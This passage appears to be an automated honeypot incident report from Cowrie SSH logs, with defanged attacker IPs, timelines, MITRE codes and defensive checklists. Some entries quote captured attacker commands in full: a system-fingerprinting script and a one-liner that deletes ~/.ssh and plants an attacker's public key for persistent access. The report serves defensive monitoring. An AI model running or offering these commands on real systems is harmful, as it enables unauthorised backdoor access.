- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae74f382180

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 15:23 |
| **Last Seen** | 2026-07-01 15:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:23:12` | `cowrie.session.connect` |
| `2026-07-01 15:23:12` | `cowrie.client.version` |
| `2026-07-01 15:23:13` | `cowrie.client.kex` |
| `2026-07-01 15:23:13` | `cowrie.login.success` |
| `2026-07-01 15:23:14` | `cowrie.session.params` |
| `2026-07-01 15:23:14` | `cowrie.command.input` |
| `2026-07-01 15:23:14` | `cowrie.command.input` |
| `2026-07-01 15:23:14` | `cowrie.command.input` |
| `2026-07-01 15:23:14` | `cowrie.command.input` |
| `2026-07-01 15:23:14` | `cowrie.command.input` |
| `2026-07-01 15:23:14` | `cowrie.command.success` |
| `2026-07-01 15:23:14` | `cowrie.command.input` |
| `2026-07-01 15:23:14` | `cowrie.command.input` |
| `2026-07-01 15:23:14` | `cowrie.command.input` |
| `2026-07-01 15:23:14` | `cowrie.command.input` |
| `2026-07-01 15:23:14` | `cowrie.log.closed` |
| `2026-07-01 15:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e75c2191709e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 15:30 |
| **Last Seen** | 2026-07-01 15:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:30:39` | `cowrie.session.connect` |
| `2026-07-01 15:30:39` | `cowrie.client.version` |
| `2026-07-01 15:30:39` | `cowrie.client.kex` |
| `2026-07-01 15:30:39` | `cowrie.login.success` |
| `2026-07-01 15:30:40` | `cowrie.session.params` |
| `2026-07-01 15:30:40` | `cowrie.command.input` |
| `2026-07-01 15:30:40` | `cowrie.command.input` |
| `2026-07-01 15:30:40` | `cowrie.command.input` |
| `2026-07-01 15:30:40` | `cowrie.command.input` |
| `2026-07-01 15:30:40` | `cowrie.command.input` |
| `2026-07-01 15:30:40` | `cowrie.command.success` |
| `2026-07-01 15:30:40` | `cowrie.command.input` |
| `2026-07-01 15:30:40` | `cowrie.command.input` |
| `2026-07-01 15:30:40` | `cowrie.command.input` |
| `2026-07-01 15:30:40` | `cowrie.command.input` |
| `2026-07-01 15:30:40` | `cowrie.log.closed` |
| `2026-07-01 15:30:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c67755940ee

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 15:30 |
| **Last Seen** | 2026-07-01 15:31 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:30:53` | `cowrie.session.connect` |
| `2026-07-01 15:30:54` | `cowrie.client.version` |
| `2026-07-01 15:30:54` | `cowrie.client.kex` |
| `2026-07-01 15:31:02` | `cowrie.login.success` |
| `2026-07-01 15:31:06` | `cowrie.session.params` |
| `2026-07-01 15:31:06` | `cowrie.command.input` |
| `2026-07-01 15:31:07` | `cowrie.log.closed` |
| `2026-07-01 15:31:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8947717e6ba4

| Field | Detail |
|---|---|
| **Source IP** | `117.50.157[.]229` |
| **First Seen** | 2026-07-01 15:34 |
| **Last Seen** | 2026-07-01 15:40 |
| **Session Duration** | 304s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:34:58` | `cowrie.session.connect` |
| `2026-07-01 15:34:59` | `cowrie.client.version` |
| `2026-07-01 15:34:59` | `cowrie.client.kex` |
| `2026-07-01 15:35:02` | `cowrie.login.success` |
| `2026-07-01 15:35:03` | `cowrie.session.params` |
| `2026-07-01 15:35:03` | `cowrie.command.input` |
| `2026-07-01 15:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.157[.]229` to AbuseIPDB if not already reported
- [ ] Block `117.50.157[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7a14b745461

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 15:35 |
| **Last Seen** | 2026-07-01 15:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:35:07` | `cowrie.session.connect` |
| `2026-07-01 15:35:07` | `cowrie.client.version` |
| `2026-07-01 15:35:07` | `cowrie.client.kex` |
| `2026-07-01 15:35:10` | `cowrie.login.success` |
| `2026-07-01 15:35:12` | `cowrie.session.params` |
| `2026-07-01 15:35:12` | `cowrie.command.input` |
| `2026-07-01 15:35:12` | `cowrie.log.closed` |
| `2026-07-01 15:35:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46879fb5796f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 15:38 |
| **Last Seen** | 2026-07-01 15:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:38:27` | `cowrie.session.connect` |
| `2026-07-01 15:38:27` | `cowrie.client.version` |
| `2026-07-01 15:38:27` | `cowrie.client.kex` |
| `2026-07-01 15:38:28` | `cowrie.login.success` |
| `2026-07-01 15:38:28` | `cowrie.session.params` |
| `2026-07-01 15:38:28` | `cowrie.command.input` |
| `2026-07-01 15:38:28` | `cowrie.command.input` |
| `2026-07-01 15:38:28` | `cowrie.command.input` |
| `2026-07-01 15:38:28` | `cowrie.command.input` |
| `2026-07-01 15:38:28` | `cowrie.command.input` |
| `2026-07-01 15:38:28` | `cowrie.command.success` |
| `2026-07-01 15:38:28` | `cowrie.command.input` |
| `2026-07-01 15:38:28` | `cowrie.command.input` |
| `2026-07-01 15:38:28` | `cowrie.command.input` |
| `2026-07-01 15:38:28` | `cowrie.command.input` |
| `2026-07-01 15:38:28` | `cowrie.log.closed` |
| `2026-07-01 15:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6140043f0de

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 15:43 |
| **Last Seen** | 2026-07-01 15:43 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:43:29` | `cowrie.session.connect` |
| `2026-07-01 15:43:30` | `cowrie.client.version` |
| `2026-07-01 15:43:30` | `cowrie.client.kex` |
| `2026-07-01 15:43:36` | `cowrie.login.success` |
| `2026-07-01 15:43:40` | `cowrie.session.params` |
| `2026-07-01 15:43:40` | `cowrie.command.input` |
| `2026-07-01 15:43:42` | `cowrie.log.closed` |
| `2026-07-01 15:43:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78d45bb0a4d1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 15:46 |
| **Last Seen** | 2026-07-01 15:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:46:00` | `cowrie.session.connect` |
| `2026-07-01 15:46:00` | `cowrie.client.version` |
| `2026-07-01 15:46:00` | `cowrie.client.kex` |
| `2026-07-01 15:46:00` | `cowrie.login.success` |
| `2026-07-01 15:46:01` | `cowrie.session.params` |
| `2026-07-01 15:46:01` | `cowrie.command.input` |
| `2026-07-01 15:46:01` | `cowrie.command.input` |
| `2026-07-01 15:46:01` | `cowrie.command.input` |
| `2026-07-01 15:46:01` | `cowrie.command.input` |
| `2026-07-01 15:46:01` | `cowrie.command.input` |
| `2026-07-01 15:46:01` | `cowrie.command.success` |
| `2026-07-01 15:46:01` | `cowrie.command.input` |
| `2026-07-01 15:46:01` | `cowrie.command.input` |
| `2026-07-01 15:46:01` | `cowrie.command.input` |
| `2026-07-01 15:46:01` | `cowrie.command.input` |
| `2026-07-01 15:46:01` | `cowrie.log.closed` |
| `2026-07-01 15:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e78f6e1feb50

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 15:52 |
| **Last Seen** | 2026-07-01 15:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:52:27` | `cowrie.session.connect` |
| `2026-07-01 15:52:28` | `cowrie.client.version` |
| `2026-07-01 15:52:28` | `cowrie.client.kex` |
| `2026-07-01 15:52:30` | `cowrie.login.success` |
| `2026-07-01 15:52:32` | `cowrie.session.params` |
| `2026-07-01 15:52:32` | `cowrie.command.input` |
| `2026-07-01 15:52:33` | `cowrie.log.closed` |
| `2026-07-01 15:52:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d346e595ff04

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 15:53 |
| **Last Seen** | 2026-07-01 15:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:53:20` | `cowrie.session.connect` |
| `2026-07-01 15:53:20` | `cowrie.client.version` |
| `2026-07-01 15:53:21` | `cowrie.client.kex` |
| `2026-07-01 15:53:21` | `cowrie.login.success` |
| `2026-07-01 15:53:22` | `cowrie.session.params` |
| `2026-07-01 15:53:22` | `cowrie.command.input` |
| `2026-07-01 15:53:22` | `cowrie.command.input` |
| `2026-07-01 15:53:22` | `cowrie.command.input` |
| `2026-07-01 15:53:22` | `cowrie.command.input` |
| `2026-07-01 15:53:22` | `cowrie.command.input` |
| `2026-07-01 15:53:22` | `cowrie.command.success` |
| `2026-07-01 15:53:22` | `cowrie.command.input` |
| `2026-07-01 15:53:22` | `cowrie.command.input` |
| `2026-07-01 15:53:22` | `cowrie.command.input` |
| `2026-07-01 15:53:22` | `cowrie.command.input` |
| `2026-07-01 15:53:22` | `cowrie.log.closed` |
| `2026-07-01 15:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]240` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bfe5e0f9fa1

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-01 15:55 |
| **Last Seen** | 2026-07-01 15:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:55:21` | `cowrie.session.connect` |
| `2026-07-01 15:55:21` | `cowrie.client.version` |
| `2026-07-01 15:55:21` | `cowrie.client.kex` |
| `2026-07-01 15:55:22` | `cowrie.login.success` |
| `2026-07-01 15:55:23` | `cowrie.session.params` |
| `2026-07-01 15:55:23` | `cowrie.command.input` |
| `2026-07-01 15:55:23` | `cowrie.command.failed` |
| `2026-07-01 15:55:24` | `cowrie.log.closed` |
| `2026-07-01 15:55:24` | `cowrie.session.params` |
| `2026-07-01 15:55:24` | `cowrie.command.input` |
| `2026-07-01 15:55:25` | `cowrie.session.file_download` |
| `2026-07-01 15:55:25` | `cowrie.log.closed` |
| `2026-07-01 15:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d050f28059d5

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-01 15:55 |
| **Last Seen** | 2026-07-01 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:55:25` | `cowrie.session.connect` |
| `2026-07-01 15:55:25` | `cowrie.client.version` |
| `2026-07-01 15:55:25` | `cowrie.client.kex` |
| `2026-07-01 15:55:26` | `cowrie.login.success` |
| `2026-07-01 15:55:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0d0b7b8bdf9

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-07-01 15:55 |
| **Last Seen** | 2026-07-01 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:55:27` | `cowrie.session.connect` |
| `2026-07-01 15:55:27` | `cowrie.client.version` |
| `2026-07-01 15:55:27` | `cowrie.client.kex` |
| `2026-07-01 15:55:28` | `cowrie.login.success` |
| `2026-07-01 15:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6251ef9bc3b7

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 15:55 |
| **Last Seen** | 2026-07-01 15:55 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:55:36` | `cowrie.session.connect` |
| `2026-07-01 15:55:38` | `cowrie.client.version` |
| `2026-07-01 15:55:38` | `cowrie.client.kex` |
| `2026-07-01 15:55:44` | `cowrie.login.success` |
| `2026-07-01 15:55:48` | `cowrie.session.params` |
| `2026-07-01 15:55:48` | `cowrie.command.input` |
| `2026-07-01 15:55:50` | `cowrie.log.closed` |
| `2026-07-01 15:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3edda288ea65

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]146` |
| **First Seen** | 2026-07-01 15:58 |
| **Last Seen** | 2026-07-01 15:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:58:23` | `cowrie.session.connect` |
| `2026-07-01 15:58:23` | `cowrie.client.version` |
| `2026-07-01 15:58:23` | `cowrie.client.kex` |
| `2026-07-01 15:58:25` | `cowrie.login.success` |
| `2026-07-01 15:58:26` | `cowrie.session.params` |
| `2026-07-01 15:58:26` | `cowrie.command.input` |
| `2026-07-01 15:58:26` | `cowrie.command.failed` |
| `2026-07-01 15:58:27` | `cowrie.log.closed` |
| `2026-07-01 15:58:28` | `cowrie.session.params` |
| `2026-07-01 15:58:28` | `cowrie.command.input` |
| `2026-07-01 15:58:28` | `cowrie.session.file_download` |
| `2026-07-01 15:58:28` | `cowrie.log.closed` |
| `2026-07-01 15:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]146` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]146` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e1917e5ce5f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]146` |
| **First Seen** | 2026-07-01 15:58 |
| **Last Seen** | 2026-07-01 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:58:28` | `cowrie.session.connect` |
| `2026-07-01 15:58:28` | `cowrie.client.version` |
| `2026-07-01 15:58:29` | `cowrie.client.kex` |
| `2026-07-01 15:58:29` | `cowrie.login.success` |
| `2026-07-01 15:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]146` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66c4ca2a380b

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]146` |
| **First Seen** | 2026-07-01 15:58 |
| **Last Seen** | 2026-07-01 15:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:58:30` | `cowrie.session.connect` |
| `2026-07-01 15:58:30` | `cowrie.client.version` |
| `2026-07-01 15:58:30` | `cowrie.client.kex` |
| `2026-07-01 15:58:31` | `cowrie.login.success` |
| `2026-07-01 15:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.121[.]146` to AbuseIPDB if not already reported
- [ ] Block `14.103.121[.]146` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d19ec68e93ed

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 15:59 |
| **Last Seen** | 2026-07-01 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 15:59:51` | `cowrie.session.connect` |
| `2026-07-01 15:59:51` | `cowrie.client.version` |
| `2026-07-01 15:59:51` | `cowrie.client.kex` |
| `2026-07-01 15:59:52` | `cowrie.login.success` |
| `2026-07-01 15:59:52` | `cowrie.session.params` |
| `2026-07-01 15:59:52` | `cowrie.command.input` |
| `2026-07-01 15:59:53` | `cowrie.log.closed` |
| `2026-07-01 15:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aed7ca1f47be

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]240` |
| **First Seen** | 2026-07-01 16:00 |
| **Last Seen** | 2026-07-01 16:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
